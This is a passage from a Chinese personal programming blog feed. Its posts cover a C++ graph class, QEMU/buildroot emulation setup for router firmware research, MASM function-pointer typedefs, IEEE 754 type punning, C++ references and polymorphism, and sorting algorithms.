<p>先放上最终代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Edge.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Graph</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Graph</span>() = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Graph</span>(<span class="type">size_t</span> nodeNum)</span><br><span class="line">	&#123;</span><br><span class="line">		tbl.<span class="built_in">resize</span>(nodeNum);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	~<span class="built_in">Graph</span>()</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">bool</span> <span class="title">addEdge</span><span class="params">(<span class="type">size_t</span> ID1, <span class="type">size_t</span> ID2)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (tbl[ID1].<span class="built_in">insert</span>(<span class="built_in">Edge</span>(ID2)).second &amp;&amp; tbl[ID2].<span class="built_in">insert</span>(<span class="built_in">Edge</span>(ID1)).second) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">printGraph</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="type">size_t</span> nodeCounter = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">auto</span>&amp; it : tbl)</span><br><span class="line">		&#123;</span><br><span class="line">			std::cout &lt;&lt; nodeCounter &lt;&lt; <span class="string">&quot;    &quot;</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">auto</span>&amp; it2:it)</span><br><span class="line">			&#123;</span><br><span class="line">				std::cout &lt;&lt; it2&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			std::cout &lt;&lt; std::endl;</span><br><span class="line">			++nodeCounter;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	std::vector&lt;std::set&lt;Edge&gt;&gt; tbl;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//分割线</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Edge</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">size_t</span> ID;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Edge</span>() = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Edge</span>(<span class="type">size_t</span> id): <span class="built_in">ID</span>(id)</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">friend</span> std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; output, <span class="type">const</span> Edge&amp; D)</span><br><span class="line">	&#123;</span><br><span class="line">		output &lt;&lt; D.ID;</span><br><span class="line">		<span class="keyword">return</span> output;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> Edge&amp; a) <span class="type">const</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>-&gt;ID &lt; a.ID;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//分割线</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Graph.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">auto</span> p = <span class="keyword">new</span> <span class="built_in">Graph</span>(<span class="number">2</span>);</span><br><span class="line">	p-&gt;<span class="built_in">addEdge</span>(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">	p-&gt;<span class="built_in">printGraph</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>首先是graph定义的数据结构, 我使用了邻接表, 原型是<code>vector&lt;set&lt;EDGE&gt;&gt;</code>原因是我这个图不允许存在重复边, 所以使用了set</p>
<p>set需要把内容元素设定一个小于操作符, 如果不设定的话会报错很多东西, 没有明确提示是未设置小于符号</p>
<p>set不是用push_back添加, 而是insert, 返回值是pair, <code>pair.first</code>是偏移, <code>pair.second</code>是插入是否成功, 插入失败意味着插入了重复元素, 此时也会返回插入偏移在first里面</p>
<p>另外, 对于impl分离的写法, 可以采用tbl[0]来对impl指针解引用, 也可以用*解引用, 最终我没有选择分离写法, 因为对于指针的泄露管制会比较麻烦, 虽然可以用makeshared, 但是我这边还没有看完more EC上面的一个章节, 那个章节讲述了如何强制要求新建对象在heap上</p>
<p>另外, for range based loop 不能采用非引用的计数器, 因为有额外开销, 必须要采用auto&amp; 这样省去了开销</p>
<p>在addEdge函数中, 我使用了短路求值优化,如果1到2有一条边并且false了, 就不会再做2到1的边添加了, 因为是同样重复的, 这里利用了短路求值</p>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
      <tags>
        <tag>未分类</tag>
      </tags>
  </entry>
  <entry>
    <title>家用路由器0day挖掘笔记（2）HTTP协议POST报文与环境配置</title>
    <url>/jia-yong-lu-you-qi-0day-wa-jue-bi-ji-2/</url>
    <content><![CDATA[<h2 id="衔接">衔接</h2>
<p>由于最终攻击目标的payload是基于POST报文的，所以我们需要对HTTP的某些部分（主要是POST）了如指掌，顺便笔者也补补课，之前学web时只是泛泛了解HTTP协议而已，希望这次的梳理能帮到大家</p>
<h2 id="配置环境">配置环境</h2>
<p>请自行搜索并安装如下环境：</p>
<p>VM虚拟机，Ubuntu12.04 （配置buildroot交叉编译MIPS环境） ，Ubuntu16.04（配置buildroot交叉编译MIPS环境），IDA(及MIPS插件)，binwalk（安装图像模块，capstone模块，Ihasa模块，sasquatch模块，squashFS模块），以及QEMU-MIPS</p>
<p>着重说一下QEMU，这个程序是我们用来虚拟化路由器环境的虚拟机</p>
<p>尽可能安装高版本的QEMU（最好是latest），否则会有一些配置上的麻烦，具体情况本文不展开，可以确定的是，latest已经修复了相关bug，但是早期版本有一些小bug</p>
<h3 id="qemu安装">QEMU安装</h3>
<p>这里是kali/Debian/Ubuntu下的安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install -y bc zlib1g-dev  libglib2.0-0 libglib2.0-dev libtool libsdl1.2-dev libpixman-1-dev autoconf qemu qemu-user qemu-user-static qemu-system</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113244.png" /></p>
<p>在干净的kali2021.2环境下,运行上述安装代码后，笔者没有遇到任何坑点</p>
<h3 id="交叉编译环境">交叉编译环境</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://buildroot.uclibc.org/downloads/snapshots/buildroot-snapshot.tar.bz2</span><br><span class="line">tar -jxvf buildroot-snapshot.tar.bz2</span><br><span class="line">cd buildroot</span><br><span class="line">sudo apt-get install libncurses-dev patch bc</span><br><span class="line">make clean</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
<p>选择<code>Target Option</code>-&gt;<code>Target Architecture</code>-&gt;<code>MIPS</code></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172113460.png" /></p>
<p>这里需要选择大小端</p>
<p>虽然MIPS默认大端，但是我们的这个漏洞的平台采用的是小端</p>
<p>然后貌似就会自动修改<code>Target Architecture Variant</code>如果没有自动修改，则手动修改为Generic MIPS（通用MIPS）</p>
<p>然后修改<code>tool chain</code>当中的Linux内核版本，修改为本机内核版本</p>
<p>查看内核可以使用</p>
<p><code>uname -r</code></p>
<p>设置成功后退出并保存</p>
<p>然后</p>
<p><code>sudo apt install -y texinfo bison flex</code></p>
<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo make</span><br></pre></td></tr></table></figure>
<p>等待编译结束</p>
<p>在干净的kali2021.2下,上述代码执行后没有遇到任何问题</p>
<p>此时我们cd到~/buildroot/output/host/usr/bin</p>
<p>可以找到mipsel-linux-gcc(把他搞个别名软连接放到系统环境里面,或者添加一个系统环境变量)</p>
<p>这里的el是little-endian的反写</p>
<p>这里我们测试一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    printf(&quot;hello world&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mipsel-linux-gcc -o hello ./main.c -static</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172112750.png" /></p>
<p>顺便测试一下刚刚安装的qemu</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172112765.png" /></p>
<p>行为正常</p>
<p>这里需要注意的一点是</p>
<p>qemu-mips用于运行程序,qemu-system-mips用于运行整个mips架构的操作系统</p>
<h3 id="chroot">chroot</h3>
<p>这里需要注意一点，我们上面使用了<code>-static</code>选项，那么，如果我们要使用动态链接库该怎么做？</p>
<p>其实很简单</p>
<p>首先复制一份qemu的副本到某个地方</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172112714.png" /></p>
<p>这样是为了环境干净和安全</p>
<p>然后用chroot更改目录，然后报错了(cannot find /bin/bash)</p>
<p>搜索了一番，加上一些笔者摸索的方法</p>
<p>首先我们需要把当前的shell复制到目录下，同时利用ldd工具，得到当前shell调用的lib库，吧lib库也复制过来</p>
<p>然后再把~/buildroot/output/host/mipsel-buildroot-linux-uclibc/sysroot下面的lib文件夹里面的东西递归-R复制过来，这就可以了</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172112282.png" /></p>
<p>这里其实最终原理很简单，但是笔者第一次做的时候没有转过弯来：</p>
<p>qemu只是虚拟机，就好比VMware，他不包含任何操作系统的系统文件，而交叉编译环境包括了所有目标环境的动态库文件所以我们复制过来就行</p>
<p>此时作者也发现了一些很重要的问题，zsh有点不兼容问题，需要改配置文件，建议还是用Ubuntu 不要用kali</p>
<h3 id="配置网络环境">配置网络环境</h3>
<p>这里借鉴了一下MrK师傅的网络配置教程，笔者之前从来也没有从0纯命令行配置TUN/TAP协议虚拟端口转发NAT连接的经验，之后会发一篇专门的教程，本系列的第三篇会稍微鸽一下</p>
<p>下面的代码直接复制并执行即可，在干净的Ubuntu12 Ubuntu16 ，Ubuntu21下均无问题</p>
<p>如果遇到了IP冲突，请手动修改，但是应该本地没有那么多监听吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install bridge-utils uml-utilities</span><br><span class="line">sudo brctl addbr virbr0</span><br><span class="line">sudo ifconfig virbr0 192.168.122.1/24 up</span><br><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo ifconfig tap0 192.168.122.11/24 up</span><br><span class="line">sudo brctl addif virbr0 tap0</span><br><span class="line">sudo dnsmasq --strict-order --except-interface=lo --interface=virbr0 --listen-address=192.168.122.1 --bind-interfaces --dhcp-range=192.168.122.2,192.168.122.254 --conf-file=&quot;&quot; --pid-file=/var/run/qemu-dhcp-virbr0.pid --dhcp-leasefile=/var/run/qemu-dhcp-virbr0.leases --dhcp-no-override</span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo sysctl -p /etc/sysctl.conf</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -s &quot;192.168.122.0/255.255.255.0&quot; ! -d &quot;192.168.122.0/255.255.255.0&quot; -j MASQUERADE</span><br><span class="line">sudo iptables -N vm-service</span><br><span class="line">sudo iptables -A vm-service -j ACCEPT</span><br><span class="line">sudo iptables -A FORWARD -s 192.168.122.0/24 -j   vm-service</span><br></pre></td></tr></table></figure>
<p>第一行是安装必要环境</p>
<p>第二行创建虚拟端口</p>
<p>第三行为端口指定IP</p>
<p>第四行创建虚拟tap</p>
<p>第五行为tap指定IP</p>
<p>第六行连接tap和虚拟端口</p>
<p>第七行是配置DHCP</p>
<p>第八行第九行，端口转发</p>
<p>第十行到最后，配置NAT和防火墙</p>
<p>然后就可以用qemu-system-mipsel测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -kernel &lt;kernelPATH&gt; -hda &lt;imgPATH&gt; -append &quot;root=/dev/sda1 console=tty0&quot; -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic</span><br></pre></td></tr></table></figure>
<p>测试log如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@ks:~# sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic</span><br><span class="line">[    0.000000] Initializing cgroup subsys cpuset</span><br><span class="line">[    0.000000] Initializing cgroup subsys cpu</span><br><span class="line">[    0.000000] Linux version 3.2.0-4-4kc-malta (debian-kernel@lists.debian.org) (gcc version 4.6.3 (Debian 4.6.3-14) ) #1 Debian 3.2.51-1</span><br><span class="line">[    0.000000] bootconsole [early0] enabled</span><br><span class="line">[    0.000000] CPU revision is: 00019300 (MIPS 24Kc)</span><br><span class="line">[    0.000000] FPU revision is: 00739300</span><br><span class="line">[    0.000000] Determined physical RAM map:</span><br><span class="line">[    0.000000]  memory: 00001000 @ 00000000 (reserved)</span><br><span class="line">[    0.000000]  memory: 000ef000 @ 00001000 (ROM data)</span><br><span class="line">[    0.000000]  memory: 00675000 @ 000f0000 (reserved)</span><br><span class="line">[    0.000000]  memory: 0789b000 @ 00765000 (usable)</span><br><span class="line">[    0.000000] Wasting 60576 bytes for tracking 1893 unused pages</span><br><span class="line">[    0.000000] Initrd not found or empty - disabling initrd</span><br><span class="line">[    0.000000] Zone PFN ranges:</span><br><span class="line">[    0.000000]   DMA      0x00000000 -&gt; 0x00001000</span><br><span class="line">[    0.000000]   Normal   0x00001000 -&gt; 0x00008000</span><br><span class="line">[    0.000000] Movable zone start PFN for each node</span><br><span class="line">[    0.000000] early_node_map[1] active PFN ranges</span><br><span class="line">[    0.000000]     0: 0x00000000 -&gt; 0x00008000</span><br><span class="line">[    0.000000] Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 32512</span><br><span class="line">[    0.000000] Kernel command line: root=/dev/sda1 console=tty0</span><br><span class="line">[    0.000000] PID hash table entries: 512 (order: -1, 2048 bytes)</span><br><span class="line">[    0.000000] Dentry cache hash table entries: 16384 (order: 4, 65536 bytes)</span><br><span class="line">[    0.000000] Inode-cache hash table entries: 8192 (order: 3, 32768 bytes)</span><br><span class="line">[    0.000000] Primary instruction cache 2kB, VIPT, 2-way, linesize 16 bytes.</span><br><span class="line">[    0.000000] Primary data cache 2kB, 2-way, VIPT, no aliases, linesize 16 bytes</span><br><span class="line">[    0.000000] Writing ErrCtl register=00000000</span><br><span class="line">[    0.000000] Readback ErrCtl register=00000000</span><br><span class="line">[    0.000000] Memory: 122332k/123500k available (4596k kernel code, 1168k reserved, 1278k data, 220k init, 0k highmem)</span><br><span class="line">[    0.000000] NR_IRQS:256</span><br><span class="line">[    0.000000] CPU frequency 200.00 MHz</span><br><span class="line">[    0.000000] Console: colour dummy device 80x25</span><br><span class="line">[    0.000000] console [tty0] enabled, bootconsole disabled</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux 7 debian-mipsel ttyS0</span><br><span class="line"></span><br><span class="line">debian-mipsel login: root</span><br><span class="line">Password: </span><br><span class="line">Linux debian-mipsel 3.2.0-4-4kc-malta #1 Debian 3.2.51-1 mips</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">root@debian-mipsel:~# ping www.baidu.com</span><br><span class="line">PING www.a.shifen.com (39.156.66.18) 56(84) bytes of data.</span><br><span class="line">64 bytes from 39.156.66.18: icmp_req=66 ttl=51 time=15.9 ms</span><br><span class="line">64 bytes from 39.156.66.18: icmp_req=67 ttl=51 time=18.6 ms</span><br><span class="line">64 bytes from 39.156.66.18: icmp_req=68 ttl=51 time=15.7 ms</span><br><span class="line">64 bytes from 39.156.66.18: icmp_req=69 ttl=51 time=16.2 ms</span><br><span class="line">64 bytes from 39.156.66.18: icmp_req=70 ttl=51 time=16.0 ms</span><br></pre></td></tr></table></figure>
<p>成功</p>
<h2 id="修复环境">修复环境</h2>
<p>这里是本文的难点。 QEMU只能模拟MIPS-CPU环境，但是无法模拟路由器当中的<strong>其他硬件</strong>，这可能会导致固件导入虚拟机后无法运行，因此我们需要<strong>重写并Hook部分so动态库</strong></p>
<h3 id="hook-nvram板载颗粒主控驱动-devnvram">Hook nvRAM板载颗粒主控驱动 (/dev/nvram)</h3>
<p>(施工中)</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>二进制</category>
        <category>0day</category>
        <category>固件</category>
      </categories>
      <tags>
        <tag>0day</tag>
        <tag>路由器</tag>
        <tag>固件</tag>
        <tag>网络</tag>
        <tag>流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>广义数据类型(如匿名函数实体)的一些想法笔记</title>
    <url>/guang-yi-shu-ju-lei-xing-ru-ni-ming-han-shu-shi-ti-de-yi-xie-xiang-fa-bi-ji/</url>
    <content><![CDATA[<p>再汇编层面,LoadLibrary配合GetProcAddress调用dll库当中的函数时,有一个问题:无法直接使用invoke</p>
<p>因为 GetProcAddress 返回的是函数地址</p>
<p>看到了一种取巧的办法能正常使用invoke</p>
<p>首先我们需要定义一种函数实体,该实体拥有n个参数,参数类型分别为A,B,C,D.....对应了我们需要调用的dll函数</p>
<p>比如我们调用foo(int X)</p>
<p>那么就先定义一种函数实体数据类型:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_PROCVAR typedef proto :dword</span><br></pre></td></tr></table></figure>
<p>然后再定义指向实体的指针</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PROCVAR typedef ptr _PROCVAR</span><br></pre></td></tr></table></figure>
<p>然后把返回值（地址）填入这个指针</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">      .data?</span><br><span class="line">lp PROCVAR</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       .code</span><br><span class="line">mov lp,eax;</span><br></pre></td></tr></table></figure>
<p>简直完美</p>
<p>同时也算是加深理解了指针和匿名实体</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>开发</category>
      </categories>
      <tags>
        <tag>匿名函数</tag>
        <tag>指针</tag>
      </tags>
  </entry>
  <entry>
    <title>强制类型转换的缺省细节和IEEE 754 规范</title>
    <url>/qiang-zhi-lei-xing-zhuan-huan-he-ieee-754-gui-fan/</url>
    <content><![CDATA[<p>随便看了一些东西</p>
<p>算是某种意义上真正理解了强制类型转换的安全性和风险性</p>
<p>本文主要讨论的是C语言环境下</p>
<p>https://www.youtube.com/watch?v=p8u_k2LIZyo</p>
<p>主要启发如上</p>
<p>结论是IEEE 754下的小数在某种意义上相当于int的以2为底的对数（在二进制下对float取对数再进行一些简单的四则运算后即可获得二进制底层下的，二者之间向下取整安全转换公式和强制按地址转换公式）</p>
<p>但是以下几个知识点阻止了我们高效操作（位运算）小数</p>
<p>float是无法进行位操作的</p>
<p>float和dw和int一般是位宽相同的（因为现在是2021年）</p>
<p>float转dw并不会得到内存上排列相同的一些比特位，比如3.01转dw得到3（0000000000....0011）</p>
<p>所以我们需要用到不安全的越界指针</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">float a;</span><br><span class="line">long b;</span><br><span class="line">b=*  (long*) &amp;a;</span><br></pre></td></tr></table></figure>
<p>所以笔者终于彻底明白了这个括号双星是什么含义了...</p>
<p>实际上是对地址的转义再解引用</p>
<p>强转地址的解释方式(也就是括号内内容)</p>
<p>然后再解引用地址,如果这时候直接打印b的值,会得到一个很大的数字,原因是IEEE 754的小数规范是科学计数法</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>开发</category>
        <category>二进制</category>
      </categories>
  </entry>
  <entry>
    <title>想写点东西但是不知道从何讲起</title>
    <url>/xiang-xie-dian-dong-xi-dan-shi-bu-zhi-dao-cong-he-jiang-qi/</url>
    <content><![CDATA[<p>https://www.youtube.com/watch?v=siQJhIp-UTU&amp;list=RDh7D27BYfjgQ&amp;index=3</p>
<p>此中有真意，欲辨已忘言</p>
]]></content>
      <categories>
        <category>黑历史与垃圾</category>
      </categories>
  </entry>
  <entry>
    <title>指针和引用的区别(1) 表象区别</title>
    <url>/zhi-zhen-he-yin-yong-de-qu-bie-1-biao-xiang-qu-bie/</url>
    <content><![CDATA[<p>指针和引用有许多相似之处, 说白了, 引用就是一种尝试, 尝试让指针包装起来, 对外表现就像一个value</p>
<p>首先需要指出的是, C语言是没有引用的, 因为C语言不是面向对象的语言, 引用本质上是面向对象的角度看待指针, 是指针的包装</p>
<p>另外, 考虑如下代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">A* ptr_a;</span><br><span class="line">A* ptr_a2 = <span class="literal">nullptr</span>;</span><br></pre></td></tr></table></figure>
<p>二者都是合法的</p>
<p>但是引用并没有所谓的空引用, 也不能在声明时不进行初始化:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* pc = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="type">char</span>&amp; pc = *pc;<span class="comment">//编译通过, 但是UB</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>&amp; pc = <span class="literal">nullptr</span>;<span class="comment">//编译不通过</span></span><br><span class="line"><span class="type">char</span>&amp; pc;<span class="comment">//编译不通过</span></span><br></pre></td></tr></table></figure>
<p>也就是说, 如果你采用了引用, 那么就不需要考虑空指针的可能性, 也不需要进行类似的assert测试</p>
<p>最后一个要点是, 引用类型只能绑定一次, 不能二次绑定</p>
<p>也就是说, 首先需要声明引用类型 并且声明时就必须初始化, 初始化意味着要把引用绑定到一个变量上面, 一旦绑定完成, 任何对引用的操作, 都不会修改绑定, 而是修改subobject 也就是引用之下的那个实体</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">string <span class="title">s1</span><span class="params">(<span class="string">&quot;A&quot;</span>)</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">s2</span><span class="params">(<span class="string">&quot;b&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	string&amp; S = s1;</span><br><span class="line"></span><br><span class="line">	S = s2;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; s1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; s2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">///输出:</span></span><br><span class="line"><span class="comment">//b b</span></span><br></pre></td></tr></table></figure>
<p>也就是说, 一旦声明完成, 引用包装就会构造完毕, 其本身不再可达, 其符号变成了完美的subobject 之alias</p>
]]></content>
      <categories>
        <category>C++简明进阶教程</category>
      </categories>
      <tags>
        <tag>C++简明进阶教程</tag>
      </tags>
  </entry>
  <entry>
    <title>指针和引用的区别(2) 工程化例子</title>
    <url>/zhi-zhen-he-yin-yong-de-qu-bie-2-gong-cheng-hua-li-zi/</url>
    <content><![CDATA[
]]></content>
      <categories>
        <category>C++简明进阶教程</category>
      </categories>
      <tags>
        <tag>C++简明进阶教程</tag>
      </tags>
  </entry>
  <entry>
    <title>排序算法笔记</title>
    <url>/pai-xu-suan-fa-bi-ji/</url>
    <content><![CDATA[<h2 id="选择排序">选择排序</h2>
<p>就是暴力法，target索引前的认为是排好的，之后的视作未排好的子集</p>
<h2 id="插入排序">插入排序</h2>
<p>把target存一份副本，taget前的元素前移，第一次前移会覆盖target，但是我们有副本，所以小问题。前移的空位用来存放新排入元素</p>
<h2 id="希尔排序">希尔排序</h2>
<p>即带步长的插入排序，可以递进分组数据排序</p>
<p>特别的：如果步长溢出则中间内容不进行排序</p>
<p>好处是插入排序在面临基本有序的数组时最高效，而步长机制可以先把数组变为基本有序，再进行全排序</p>
<h2 id="归并排序">归并排序</h2>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>正确理解继承和多态</title>
    <url>/zheng-que-li-jie-ji-cheng-he-duo-tai/</url>
    <content><![CDATA[<p>关于多态, C++其实是饱受诟病的, JAVA在这点上做的比C++ 好多了, 因为JAVA有 <span class="citation" data-cites="Override">@Override</span> 标识符, 这样就不会产生一些隐性的问题</p>
<p>首先我们先来看第一个问题, 非纯的虚函数<strong>不应当被使用</strong></p>
<p>看下列例子</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">shape</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">draw</span><span class="params">()</span></span>=<span class="number">0</span>;<span class="comment">//提供接口, 不提供任何实现, 继承时只会继承接口, 不会继承任何底层实现</span></span><br><span class="line">&#125;;<span class="comment">//绘制函数无法对不同的形状给出合理的缺省函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">plane</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">flyControl</span><span class="params">()</span></span>&#123;<span class="comment">//提供接口, 且提供实现, 继承时会继承接口, 还会继承一个实现</span></span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;<span class="comment">//缺省飞行函数</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">planeA</span>: <span class="keyword">public</span> plane&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//...继承了飞行函数接口, 和默认实现</span></span><br><span class="line">    <span class="comment">//但是默认实现不适用与A型号的飞机, 程序员可能会忘记重新覆写虚函数接口上的默认实现</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//更好的办法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">plane</span>&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">defaultFly</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">flyControl</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">planeA</span>: <span class="keyword">public</span> plane&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//..</span></span><br><span class="line">    <span class="comment">// A型号飞机可以选择通过虚接口调用默认飞行函数(这个是非虚函数, 不会继承接口, 只会继承实现), 也可以选择自己继承接口后,自己实现</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>也就是说, 要么继承接口, 要么继承实现, 如果你需要为虚函数接口提供默认实现, 请把他们分开, 分成一个protected非虚函数, 和一个纯虚的接口, 不要混合成一个单一的非纯虚函数。</p>
